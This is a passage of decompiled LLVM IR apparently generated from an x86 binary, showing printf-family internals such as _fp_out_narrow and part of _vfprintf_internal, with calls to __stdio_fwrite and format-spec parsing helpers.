  %v2_80504fb = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_80504fb

dec_label_pc_80504f6:                             ; preds = %dec_label_pc_80504fb
  %v1_80504f6 = add i32 %v0_80504f6, -1
  %v8_80504f6 = icmp eq i32 %v1_80504f6, 0
  store i32 %v1_80504f6, i32* @ebx, align 4
  br i1 %v8_80504f6, label %dec_label_pc_805050f.loopexit, label %dec_label_pc_80504f6.dec_label_pc_80504fb_crit_edge

dec_label_pc_80504f6.dec_label_pc_80504fb_crit_edge: ; preds = %dec_label_pc_80504f6
  %v0_80504ff.pre = load i32, i32* @edx, align 4
  %v0_8050500.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80504fb

dec_label_pc_80504fb:                             ; preds = %dec_label_pc_80504f6.dec_label_pc_80504fb_crit_edge, %dec_label_pc_80504fb.lr.ph
  %v0_8050500 = phi i32 [ %v0_8050500.pre, %dec_label_pc_80504f6.dec_label_pc_80504fb_crit_edge ], [ %v0_80504e7, %dec_label_pc_80504fb.lr.ph ]
  %v0_80504ff = phi i32 [ %v0_80504ff.pre, %dec_label_pc_80504f6.dec_label_pc_80504fb_crit_edge ], [ %v0_80504f0, %dec_label_pc_80504fb.lr.ph ]
  %v4_8050504 = call i32 @__stdio_fwrite(i32 %v2_80504fb, i32 1, i32 %v0_8050500, i32 %v0_80504ff)
  %v8_805050c = icmp eq i32 %v4_8050504, 1
  %v0_80504f6 = load i32, i32* @ebx, align 4
  br i1 %v8_805050c, label %dec_label_pc_80504f6, label %dec_label_pc_805050f.loopexit

dec_label_pc_805050f.loopexit:                    ; preds = %dec_label_pc_80504f6, %dec_label_pc_80504fb
  %v1_805050f.ph = phi i32 [ %v0_80504f6, %dec_label_pc_80504fb ], [ 0, %dec_label_pc_80504f6 ]
  %v0_805050f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805050f

dec_label_pc_805050f:                             ; preds = %dec_label_pc_805050f.loopexit, %entry
  %v0_805050f = phi i32 [ 0, %entry ], [ %v0_805050f.pre, %dec_label_pc_805050f.loopexit ]
  %v1_805050f = phi i32 [ 0, %entry ], [ %v1_805050f.ph, %dec_label_pc_805050f.loopexit ]
  %v2_805050f = sub i32 %v0_805050f, %v1_805050f
  store i32 %v0_80504e6, i32* @ebx, align 4
  store i32 %v0_80504e5, i32* @esi, align 4
  store i32 %v0_80504e4, i32* @edi, align 4
  ret i32 %v2_805050f

; uselistorder directives
  uselistorder i32 %v1_80504f6, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_805050f.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_805052d = trunc i32 %arg2 to i8
  %v5_805052d = icmp slt i8 %v3_805052d, 0
  %v1_805052f = icmp eq i1 %v5_805052d, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_805052f, label %dec_label_pc_8050560, label %dec_label_pc_8050531

dec_label_pc_8050531:                             ; preds = %entry
  %v3_8050538 = call i32 @strlen(i8* %arg4)
  %v0_8050540 = load i32, i32* @ebx, align 4
  %v2_8050540 = sub i32 %v0_8050540, %v3_8050538
  store i32 %v2_8050540, i32* @ebx, align 4
  store i32 %v3_8050538, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_8050540, 1
  br i1 %tmp23, label %dec_label_pc_805055e, label %dec_label_pc_8050548

dec_label_pc_8050548:                             ; preds = %dec_label_pc_8050531
  %v0_8050548 = load i32, i32* @edi, align 4
  %v1_8050548 = urem i32 %v0_8050548, 128
  store i32 %v1_8050548, i32* @edi, align 4
  store i32 %v2_8050540, i32* @ecx, align 4
  store i32 %v1_8050548, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_8050553 = call i32 @_charpad()
  store i32 %v0_8050553, i32* @ebp, align 4
  %v12_805055a = icmp eq i32 %v0_8050553, %v2_8050540
  %v1_805055c = icmp eq i1 %v12_805055a, false
  br i1 %v1_805055c, label %dec_label_pc_805057a, label %dec_label_pc_8050548.dec_label_pc_805055e_crit_edge

dec_label_pc_8050548.dec_label_pc_805055e_crit_edge: ; preds = %dec_label_pc_8050548
  %v0_805055e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805055e

dec_label_pc_805055e:                             ; preds = %dec_label_pc_8050548.dec_label_pc_805055e_crit_edge, %dec_label_pc_8050531
  %v0_805055e = phi i32 [ %v0_805055e.pre, %dec_label_pc_8050548.dec_label_pc_805055e_crit_edge ], [ %v3_8050538, %dec_label_pc_8050531 ]
  store i32 %v0_805055e, i32* @ebx, align 4
  br label %dec_label_pc_8050560

dec_label_pc_8050560:                             ; preds = %entry, %dec_label_pc_805055e
  %v0_805056b = phi i32 [ %arg3, %entry ], [ %v0_805055e, %dec_label_pc_805055e ]
  %tmp24 = icmp slt i32 %v0_805056b, 1
  br i1 %tmp24, label %dec_label_pc_8050578, label %dec_label_pc_8050566

dec_label_pc_8050566:                             ; preds = %dec_label_pc_8050560
  %v0_8050566 = load i32, i32* @ecx, align 4
  %v5_8050570 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_805056b, i32 %arg1, i32 %v0_8050566)
  br label %dec_label_pc_8050578

dec_label_pc_8050578:                             ; preds = %dec_label_pc_8050560, %dec_label_pc_8050566
  %v1_8050578 = phi i32 [ 0, %dec_label_pc_8050560 ], [ %v5_8050570, %dec_label_pc_8050566 ]
  %v0_8050578 = load i32, i32* @ebp, align 4
  %v2_8050578 = add i32 %v0_8050578, %v1_8050578
  br label %dec_label_pc_805057a

dec_label_pc_805057a:                             ; preds = %dec_label_pc_8050548, %dec_label_pc_8050578
  %v0_805057d = phi i32 [ %v0_8050553, %dec_label_pc_8050548 ], [ %v2_8050578, %dec_label_pc_8050578 ]
  ret i32 %v0_805057d

; uselistorder directives
  uselistorder i32 %v0_805056b, { 1, 0 }
  uselistorder i32 %v0_8050553, { 1, 0, 2 }
  uselistorder i32 %v1_8050548, { 1, 0 }
  uselistorder i32 %v2_8050540, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805057a, { 1, 0 }
  uselistorder label %dec_label_pc_8050578, { 1, 0 }
  uselistorder label %dec_label_pc_8050560, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_805058e = ptrtoint i8* %arg2 to i32
  store i32 %v4_805058e, i32* @ebx, align 4
  %v2_8050596 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_8050596, i32* @esi, align 4
  %v5_805059b = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_805058e)
  store i32 %v5_805059b, i32* %eax.global-to-local, align 4
  %v2_80505a3 = icmp slt i32 %v5_805059b, 0
  %v1_80505a5 = icmp eq i1 %v2_80505a3, false
  br i1 %v1_80505a5, label %dec_label_pc_80505e5, label %dec_label_pc_80505a7

dec_label_pc_80505a7:                             ; preds = %entry
  %v3_80505a7 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_80505a7, i32* @ebx, align 4
  %v5_80505ae = inttoptr i32 %v3_80505a7 to i8*
  %v3_80505af = call i32 @strlen(i8* %v5_80505ae)
  store i32 %v3_80505af, i32* %eax.global-to-local, align 4
  %v1_80505b7 = icmp eq i32 %v3_80505af, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_80505b7, label %dec_label_pc_8050b1e, label %dec_label_pc_80505c6

dec_label_pc_80505c6:                             ; preds = %dec_label_pc_80505a7
  %v0_80505c6 = load i32, i32* @edx, align 4
  %v0_80505cf = load i32, i32* @ebx, align 4
  %v6_80505d0 = call i32 @__stdio_fwrite(i32 %v0_80505cf, i32 %v3_80505af, i32 %arg1, i32 %v0_80505c6)
  store i32 %v6_80505d0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_8050b1e

dec_label_pc_80505e5:                             ; preds = %entry
  %v6_80505ef = call i32 @_ppfs_prepargs(i32 %v2_8050596, i32 %arg3, i32 %v5_805059b, i32 %v5_805059b)
  store i32 %v6_80505ef, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_80505fc = load i32, i32* @ebx, align 4
  store i32 %v0_80505fc, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050604

dec_label_pc_8050603:                             ; preds = %dec_label_pc_805060a
  %v1_8050603 = add i32 %v0_8050612, 1
  store i32 %v1_8050603, i32* @ebx, align 4
  br label %dec_label_pc_8050604.backedge

dec_label_pc_8050604.backedge:                    ; preds = %dec_label_pc_8050603, %dec_label_pc_8050b04, %dec_label_pc_8050b0f
  %v1_805060e20 = phi i32 [ %v1_8050616, %dec_label_pc_8050603 ], [ %v3_8050b04, %dec_label_pc_8050b04 ], [ %v1_8050642, %dec_label_pc_8050b0f ]
  %v0_805060418 = phi i32 [ %v1_8050603, %dec_label_pc_8050603 ], [ %v3_8050b04, %dec_label_pc_8050b04 ], [ %v1_8050b0f, %dec_label_pc_8050b0f ]
  %v4_8050604.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050604

dec_label_pc_8050604:                             ; preds = %dec_label_pc_8050604.backedge, %dec_label_pc_80505e5
  %v1_8050616 = phi i32 [ %v1_805060e20, %dec_label_pc_8050604.backedge ], [ %v0_80505fc, %dec_label_pc_80505e5 ]
  %v0_8050612 = phi i32 [ %v0_805060418, %dec_label_pc_8050604.backedge ], [ %v0_80505fc, %dec_label_pc_80505e5 ]
  %v4_8050604 = phi i32 [ %v4_8050604.pre, %dec_label_pc_8050604.backedge ], [ %v6_80505ef, %dec_label_pc_80505e5 ]
  %v1_8050604 = inttoptr i32 %v0_8050612 to i8*
  %v2_8050604 = load i8, i8* %v1_8050604, align 1
  %v3_8050604 = zext i8 %v2_8050604 to i32
  %v5_8050604 = and i32 %v4_8050604, -256
  %v6_8050604 = or i32 %v3_8050604, %v5_8050604
  store i32 %v6_8050604, i32* %eax.global-to-local, align 4
  %v4_8050606 = icmp eq i8 %v2_8050604, 0
  br i1 %v4_8050606, label %dec_label_pc_805060e, label %dec_label_pc_805060a

dec_label_pc_805060a:                             ; preds = %dec_label_pc_8050604
  %v10_805060a = icmp eq i8 %v2_8050604, 37
  %v1_805060c = icmp eq i1 %v10_805060a, false
  br i1 %v1_805060c, label %dec_label_pc_8050603, label %dec_label_pc_805060e

dec_label_pc_805060e:                             ; preds = %dec_label_pc_805060a, %dec_label_pc_8050604
  %v2_805060e = sub i32 %v0_8050612, %v1_8050616
  %v12_805060e = icmp eq i32 %v2_805060e, 0
  br i1 %v12_805060e, label %dec_label_pc_8050639, label %dec_label_pc_8050612

dec_label_pc_8050612:                             ; preds = %dec_label_pc_805060e
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_805060e, i32* @esi, align 4
  %tmp67 = icmp slt i32 %v2_805060e, 1
  br i1 %tmp67, label %dec_label_pc_805062e, label %dec_label_pc_805061c

dec_label_pc_805061c:                             ; preds = %dec_label_pc_8050612
  %v0_805061c = load i32, i32* @ebp, align 4
  %v1_805061c = load i32, i32* @esp, align 4
  %v2_805061c = add i32 %v1_805061c, -4
  %v3_805061c = inttoptr i32 %v2_805061c to i32*
  store i32 %v0_805061c, i32* %v3_805061c, align 4
  %v1_805061d = add i32 %v1_805061c, 368
  %v2_805061d = inttoptr i32 %v1_805061d to i32*
  %v3_805061d = load i32, i32* %v2_805061d, align 4
  %v5_805061d = add i32 %v1_805061c, -8
  %v6_805061d = inttoptr i32 %v5_805061d to i32*
  store i32 %v3_805061d, i32* %v6_805061d, align 4
  %v0_8050624 = load i32, i32* @esi, align 4
  %v2_8050624 = add i32 %v1_805061c, -12
  %v3_8050624 = inttoptr i32 %v2_8050624 to i32*
  store i32 %v0_8050624, i32* %v3_8050624, align 4
  %v0_8050625 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050625 = add i32 %v1_805061c, -16
  %v3_8050625 = inttoptr i32 %v2_8050625 to i32*
  store i32 %v0_8050625, i32* %v3_8050625, align 4
  %v0_8050626 = load i32, i32* %stack_var_-364, align 4
  %v4_8050626 = call i32 @__stdio_fwrite(i32 %v0_8050626, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050626, i32* %eax.global-to-local, align 4
  %v1_805062e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805062e

dec_label_pc_805062e:                             ; preds = %dec_label_pc_8050612, %dec_label_pc_805061c
  %v3_8050636 = phi i32 [ %v2_805060e, %dec_label_pc_8050612 ], [ %v1_805062e.pre, %dec_label_pc_805061c ]
  %v0_805062e = phi i32 [ 0, %dec_label_pc_8050612 ], [ %v4_8050626, %dec_label_pc_805061c ]
  %v12_805062e = icmp eq i32 %v0_805062e, %v3_8050636
  %v1_8050630 = icmp eq i1 %v12_805062e, false
  %v0_8050b17.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_8050630, label %dec_label_pc_8050b17, label %dec_label_pc_8050636

dec_label_pc_8050636:                             ; preds = %dec_label_pc_805062e
  %v1_8050636 = inttoptr i32 %v0_8050b17.pre.pre to i32*
  %v2_8050636 = load i32, i32* %v1_8050636, align 4
  %v4_8050636 = add i32 %v2_8050636, %v3_8050636
  store i32 %v4_8050636, i32* %v1_8050636, align 4
  %v0_8050639.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050639

dec_label_pc_8050639:                             ; preds = %dec_label_pc_805060e, %dec_label_pc_8050636
  %v0_8050b0f = phi i32 [ %v0_8050612, %dec_label_pc_805060e ], [ %v0_8050639.pre, %dec_label_pc_8050636 ]
  %v1_8050639 = inttoptr i32 %v0_8050b0f to i8*
  %v2_8050639 = load i8, i8* %v1_8050639, align 1
  %v3_8050639 = icmp eq i8 %v2_8050639, 0
  br i1 %v3_8050639, label %dec_label_pc_8050b1e, label %dec_label_pc_8050642

dec_label_pc_8050642:                             ; preds = %dec_label_pc_8050639
  %v1_8050642 = add i32 %v0_8050b0f, 1
  store i32 %v1_8050642, i32* %edx.global-to-local, align 4
  %v2_8050645 = inttoptr i32 %v1_8050642 to i8*
  %v3_8050645 = load i8, i8* %v2_8050645, align 1
  %v12_8050645 = icmp eq i8 %v3_8050645, 37
  br i1 %v12_8050645, label %dec_label_pc_8050b0f, label %dec_label_pc_805064f

dec_label_pc_805064f:                             ; preds = %dec_label_pc_8050642
  %v1_805064f = load i32, i32* @esp, align 4
  %v2_805064f = add i32 %v1_805064f, 16
  %v3_805064f = inttoptr i32 %v2_805064f to i32*
  store i32 %v1_8050642, i32* %v3_805064f, align 4
  %v0_8050653 = load i32, i32* @esp, align 4
  %v1_8050653 = add i32 %v0_8050653, 340
  %v2_8050653 = inttoptr i32 %v1_8050653 to i32*
  store i32 0, i32* %v2_8050653, align 4
  %v0_805065e = load i32, i32* @esp, align 4
  %v1_8050661 = add i32 %v0_805065e, 16
  store i32 %v1_8050661, i32* @ebx, align 4
  %v2_8050665 = add i32 %v0_805065e, -16
  %v3_8050665 = inttoptr i32 %v2_8050665 to i32*
  store i32 %v1_8050661, i32* %v3_8050665, align 4
  %v0_8050666 = load i32, i32* %stack_var_-364, align 4
  %v1_8050666 = inttoptr i32 %v0_8050666 to i32*
  %v2_8050666 = call i32 @_ppfs_parsespec(i32* %v1_8050666)
  store i32 %v2_8050666, i32* %eax.global-to-local, align 4
  %v0_805066b = load i32, i32* @ebx, align 4
  %v1_805066b = load i32, i32* @esp, align 4
  %v2_805066b = inttoptr i32 %v1_805066b to i32*
  store i32 %v0_805066b, i32* %v2_805066b, align 4
  %v0_805066e = load i32, i32* %stack_var_-364, align 4
  %v1_805066e = call i32 @_ppfs_setargs(i32 %v0_805066e)
  store i32 %v1_805066e, i32* %eax.global-to-local, align 4
  %v0_8050673 = load i32, i32* @esp, align 4
  %v1_8050673 = add i32 %v0_8050673, 70
  %v2_8050673 = inttoptr i32 %v1_8050673 to i8*
  %v3_8050673 = load i8, i8* %v2_8050673, align 1
  %v4_8050673 = zext i8 %v3_8050673 to i32
  store i32 %v4_8050673, i32* @edi, align 4
  %v1_8050678 = add i32 %v0_8050673, 16
  %v1_805067b = add i32 %v0_8050673, 56
  %v2_805067b = inttoptr i32 %v1_805067b to i32*
  %v3_805067b = load i32, i32* %v2_805067b, align 4
  %v1_8050680 = add i32 %v0_8050673, 112
  store i32 %v1_8050680, i32* %edx.global-to-local, align 4
  %tmp68 = icmp slt i32 %v3_805067b, 1
  br i1 %tmp68, label %dec_label_pc_805068d, label %dec_label_pc_8050686

dec_label_pc_8050686:                             ; preds = %dec_label_pc_805064f
  %v2_8050686 = zext i8 %v3_8050673 to i32
  %v3_8050686 = mul nuw nsw i32 %v2_8050686, 12
  store i32 %v3_8050686, i32* %eax.global-to-local, align 4
  %v2_8050689 = add i32 %v0_8050673, 100
  %v3_8050689 = add i32 %v2_8050689, %v3_8050686
  store i32 %v3_8050689, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805068d

dec_label_pc_805068d:                             ; preds = %dec_label_pc_805064f, %dec_label_pc_8050686
  %v0_805069528 = phi i32 [ %v1_8050680, %dec_label_pc_805064f ], [ %v3_8050689, %dec_label_pc_8050686 ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805068f = add i32 %v0_8050673, 60
  %v2_805068f = inttoptr i32 %v1_805068f to i32*
  %v3_805068f = load i32, i32* %v2_805068f, align 4
  store i32 %v3_805068f, i32* %ecx.global-to-local, align 4
  %v2_80506a081 = sub i32 0, %v3_805068f
  %v10_80506a084 = and i32 %v3_805068f, %v2_80506a081
  %v11_80506a085 = icmp slt i32 %v10_80506a084, 0
  %v13_80506a086 = icmp slt i32 %v2_80506a081, 0
  %v2_80506a287 = icmp eq i1 %v13_80506a086, %v11_80506a085
  br i1 %v2_80506a287, label %dec_label_pc_80506a4, label %dec_label_pc_8050695

dec_label_pc_8050695:                             ; preds = %dec_label_pc_805068d, %dec_label_pc_8050695
  %v0_80506a491 = phi i32 [ %v0_80506a4, %dec_label_pc_8050695 ], [ %v1_8050678, %dec_label_pc_805068d ]
  %v2_805069590 = phi i32 [ %v1_805069f, %dec_label_pc_8050695 ], [ 0, %dec_label_pc_805068d ]
  %v0_805069589 = phi i32 [ %v1_805069c, %dec_label_pc_8050695 ], [ %v0_805069528, %dec_label_pc_805068d ]
  %v3_8050695 = mul i32 %v2_805069590, 4
  %v4_8050695 = add i32 %v0_80506a491, 344
  %v5_8050695 = add i32 %v4_8050695, %v3_8050695
  %v6_8050695 = inttoptr i32 %v5_8050695 to i32*
  store i32 %v0_805069589, i32* %v6_8050695, align 4
  %v0_805069c = load i32, i32* %edx.global-to-local, align 4
  %v1_805069c = add i32 %v0_805069c, 12
  store i32 %v1_805069c, i32* %edx.global-to-local, align 4
  %v0_805069f = load i32, i32* %eax.global-to-local, align 4
  %v1_805069f = add i32 %v0_805069f, 1
  store i32 %v1_805069f, i32* %eax.global-to-local, align 4
  %v1_80506a0.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_80506a0 = sub i32 %v1_805069f, %v1_80506a0.pre
  %v8_80506a0 = xor i32 %v1_805069f, %v1_80506a0.pre
  %v9_80506a0 = xor i32 %v2_80506a0, %v1_805069f
  %v10_80506a0 = and i32 %v9_80506a0, %v8_80506a0
  %v11_80506a0 = icmp slt i32 %v10_80506a0, 0
  %v13_80506a0 = icmp slt i32 %v2_80506a0, 0
  %v2_80506a2 = icmp eq i1 %v13_80506a0, %v11_80506a0
  %v0_80506a4 = load i32, i32* @esp, align 4
  br i1 %v2_80506a2, label %dec_label_pc_80506a4, label %dec_label_pc_8050695

dec_label_pc_80506a4:                             ; preds = %dec_label_pc_8050695, %dec_label_pc_805068d
  %v0_80506a4.lcssa = phi i32 [ %v1_8050678, %dec_label_pc_805068d ], [ %v0_80506a4, %dec_label_pc_8050695 ]
  %v1_80506a4 = add i32 %v0_80506a4.lcssa, 48
  %v2_80506a4 = inttoptr i32 %v1_80506a4 to i32*
  %v3_80506a4 = load i32, i32* %v2_80506a4, align 4
  store i32 %v3_80506a4, i32* @ecx, align 4
  %v1_80506a8 = icmp eq i32 %v3_80506a4, 0
  %v1_80506aa = icmp eq i1 %v1_80506a8, false
  br i1 %v1_80506aa, label %dec_label_pc_80506d2, label %dec_label_pc_80506ac

dec_label_pc_80506ac:                             ; preds = %dec_label_pc_80506a4
  %v1_80506ac = inttoptr i32 %v0_80506a4.lcssa to i32*
  %v2_80506ac = load i32, i32* %v1_80506ac, align 4
  store i32 %v2_80506ac, i32* %eax.global-to-local, align 4
  %v1_80506af = ashr i32 %v2_80506ac, 31
  store i32 %v1_80506af, i32* %edx.global-to-local, align 4
  %v2_80506b0 = add i32 %v0_80506a4.lcssa, -4
  %v3_80506b0 = inttoptr i32 %v2_80506b0 to i32*
  store i32 %v1_80506af, i32* %v3_80506b0, align 4
  %v0_80506b1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80506b1 = add i32 %v0_80506a4.lcssa, -8
  %v3_80506b1 = inttoptr i32 %v2_80506b1 to i32*
  store i32 %v0_80506b1, i32* %v3_80506b1, align 4
  %v1_80506b2 = add i32 %v0_80506a4.lcssa, 32
  %v2_80506b2 = inttoptr i32 %v1_80506b2 to i32*
  %v3_80506b2 = load i32, i32* %v2_80506b2, align 4
  %v1_80506b6 = and i32 %v3_80506b2, 3840
  store i32 %v1_80506b6, i32* %eax.global-to-local, align 4
  %v2_80506bb = add i32 %v0_80506a4.lcssa, -12
  %v3_80506bb = inttoptr i32 %v2_80506bb to i32*
  store i32 %v1_80506b6, i32* %v3_80506bb, align 4
  %v1_80506bc = add i32 %v0_80506a4.lcssa, 344
  %v2_80506bc = inttoptr i32 %v1_80506bc to i32*
  %v3_80506bc = load i32, i32* %v2_80506bc, align 4
  store i32 %v3_80506bc, i32* %eax.global-to-local, align 4
  %v1_80506c3 = inttoptr i32 %v3_80506bc to i32*
  %v2_80506c3 = load i32, i32* %v1_80506c3, align 4
  %v4_80506c3 = add i32 %v0_80506a4.lcssa, -16
  %v5_80506c3 = inttoptr i32 %v4_80506c3 to i32*
  store i32 %v2_80506c3, i32* %v5_80506c3, align 4
  %v0_80506c5 = call i32 @_store_inttype()
  store i32 %v0_80506c5, i32* %eax.global-to-local, align 4
  %v0_80506ca = load i32, i32* @esp, align 4
  %v1_80506ca = add i32 %v0_80506ca, 16
  br label %dec_label_pc_8050b04

dec_label_pc_80506d2:                             ; preds = %dec_label_pc_80506a4
  %tmp94 = icmp ult i32 %v3_80506a4, 8
  br i1 %tmp94, label %dec_label_pc_80506db, label %dec_label_pc_805083c

dec_label_pc_80506db:                             ; preds = %dec_label_pc_80506d2
  %v1_80506db = add i32 %v3_80506a4, 134610096
  %v2_80506db = inttoptr i32 %v1_80506db to i8*
  %v3_80506db = load i8, i8* %v2_80506db, align 1
  %v4_80506db = sext i8 %v3_80506db to i32
  store i32 %v4_80506db, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_80506e7 = icmp eq i8 %v3_80506db, 10
  %v1_80506ea = icmp eq i1 %v9_80506e7, false
  br i1 %v1_80506ea, label %dec_label_pc_8050708, label %dec_label_pc_80506ec

dec_label_pc_80506ec:                             ; preds = %dec_label_pc_80506db
  %v1_80506ec = add i32 %v0_80506a4.lcssa, 32
  %v2_80506ec = inttoptr i32 %v1_80506ec to i32*
  %v3_80506ec = load i32, i32* %v2_80506ec, align 4
  %v1_80506f2 = and i32 %v3_80506ec, 32
  store i32 %v1_80506f2, i32* %eax.global-to-local, align 4
  %tmp69 = udiv i32 %v1_80506f2, 32
  %tmp70 = sub nsw i32 45, %tmp69
  store i32 %tmp70, i32* @ebx, align 4
  %v1_8050700 = trunc i32 %v3_80506ec to i8
  %v2_8050700 = and i8 %v1_8050700, 64
  %v3_8050700 = icmp eq i8 %v2_8050700, 0
  %v5_8050700 = zext i8 %v2_8050700 to i32
  %v7_8050700 = and i32 %v3_80506ec, -256
  %v8_8050700 = or i32 %v5_8050700, %v7_8050700
  store i32 %v8_8050700, i32* %edx.global-to-local, align 4
  br i1 %v3_8050700, label %dec_label_pc_8050708, label %dec_label_pc_8050705

dec_label_pc_8050705:                             ; preds = %dec_label_pc_80506ec
  %v2_8050705 = or i32 %tmp70, 128
  store i32 %v2_8050705, i32* @ebx, align 4
  br label %dec_label_pc_8050708

dec_label_pc_8050708:                             ; preds = %dec_label_pc_80506ec, %dec_label_pc_80506db, %dec_label_pc_8050705
  %tmp95 = icmp ult i32 %v3_80506a4, 6
  br i1 %tmp95, label %dec_label_pc_805070d, label %dec_label_pc_8050725

dec_label_pc_805070d:                             ; preds = %dec_label_pc_8050708
  %v9_805070d = icmp eq i32 %v3_80506a4, 3
  %v1_8050710 = icmp eq i1 %v9_805070d, false
  br i1 %v1_8050710, label %dec_label_pc_8050719, label %dec_label_pc_8050712

dec_label_pc_8050712:                             ; preds = %dec_label_pc_805070d
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_8050727

dec_label_pc_8050719:                             ; preds = %dec_label_pc_805070d
  %v9_805071e = icmp eq i32 %v3_80506a4, 1
  br i1 %v9_805071e, label %dec_label_pc_805072c, label %dec_label_pc_8050727

dec_label_pc_8050725:                             ; preds = %dec_label_pc_8050708
  %v1_8050725 = sub nsw i32 0, %v4_80506db
  store i32 %v1_8050725, i32* @esi, align 4
  br label %dec_label_pc_8050727

dec_label_pc_8050727:                             ; preds = %dec_label_pc_8050719, %dec_label_pc_8050712, %dec_label_pc_8050725
  br label %dec_label_pc_805072c

dec_label_pc_805072c:                             ; preds = %dec_label_pc_8050719, %dec_label_pc_8050727
  %storemerge106 = phi i32 [ 11, %dec_label_pc_8050727 ], [ 6, %dec_label_pc_8050719 ]
  store i32 %storemerge106, i32* @ebp, align 4
  %v1_805072c = add i32 %v0_80506a4.lcssa, 7
  %v2_805072c = inttoptr i32 %v1_805072c to i8*
  store i8 32, i8* %v2_805072c, align 1
  %v0_8050731 = load i32, i32* @esp, align 4
  %v1_8050731 = add i32 %v0_8050731, 20
  %v2_8050731 = inttoptr i32 %v1_8050731 to i32*
  %v3_8050731 = load i32, i32* %v2_8050731, align 4
  %v5_8050731 = icmp slt i32 %v3_8050731, 0
  %v1_8050736 = icmp eq i1 %v5_8050731, false
  br i1 %v1_8050736, label %dec_label_pc_8050740, label %dec_label_pc_8050738

dec_label_pc_8050738:                             ; preds = %dec_label_pc_805072c
  %v1_8050738 = add i32 %v0_8050731, 36
  %v2_8050738 = inttoptr i32 %v1_8050738 to i8*
  %v3_8050738 = load i8, i8* %v2_8050738, align 1
  %v4_8050738 = zext i8 %v3_8050738 to i32
  %v5_8050738 = load i32, i32* %edx.global-to-local, align 4
  %v6_8050738 = and i32 %v5_8050738, -256
  %v7_8050738 = or i32 %v6_8050738, %v4_8050738
  store i32 %v7_8050738, i32* %edx.global-to-local, align 4
  %v3_805073c = add i32 %v0_8050731, 7
  %v4_805073c = inttoptr i32 %v3_805073c to i8*
  store i8 %v3_8050738, i8* %v4_805073c, align 1
  %v0_8050740.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050740

dec_label_pc_8050740:                             ; preds = %dec_label_pc_805072c, %dec_label_pc_8050738
  %v1_8050759 = phi i32 [ %v0_8050731, %dec_label_pc_805072c ], [ %v0_8050740.pre, %dec_label_pc_8050738 ]
  %v1_8050740 = add i32 %v1_8050759, 344
  %v2_8050740 = inttoptr i32 %v1_8050740 to i32*
  %v3_8050740 = load i32, i32* %v2_8050740, align 4
  store i32 %v3_8050740, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_805074c = add i32 %v3_80506a4, -1
  %v8_805074c = icmp eq i32 %v1_805074c, 0
  store i32 %v1_805074c, i32* %ecx.global-to-local, align 4
  %v0_8050759.pre = load i32, i32* @edi, align 4
  br i1 %v8_805074c, label %dec_label_pc_8050759, label %dec_label_pc_805074f

dec_label_pc_805074f:                             ; preds = %dec_label_pc_8050740
  %v2_805074f = mul i32 %v0_8050759.pre, 4
  %v3_805074f = add i32 %v1_8050759, 52
  %v4_805074f = add i32 %v3_805074f, %v2_805074f
  %v5_805074f = inttoptr i32 %v4_805074f to i32*
  %v6_805074f = load i32, i32* %v5_805074f, align 4
  %v1_8050753 = and i32 %v6_805074f, 3840
  store i32 %v1_8050753, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050759

dec_label_pc_8050759:                             ; preds = %dec_label_pc_8050740, %dec_label_pc_805074f
  %v2_8050759 = add i32 %v1_8050759, -4
  %v3_8050759 = inttoptr i32 %v2_8050759 to i32*
  store i32 %v0_8050759.pre, i32* %v3_8050759, align 4
  %v0_805075a = load i32, i32* @esi, align 4
  %v2_805075a = add i32 %v1_8050759, -8
  %v3_805075a = inttoptr i32 %v2_805075a to i32*
  store i32 %v0_805075a, i32* %v3_805075a, align 4
  %v0_805075b = load i32, i32* %eax.global-to-local, align 4
  %v2_805075b = add i32 %v1_8050759, -12
  %v3_805075b = inttoptr i32 %v2_805075b to i32*
  store i32 %v0_805075b, i32* %v3_805075b, align 4
  %v0_805075c = load i32, i32* %edx.global-to-local, align 4
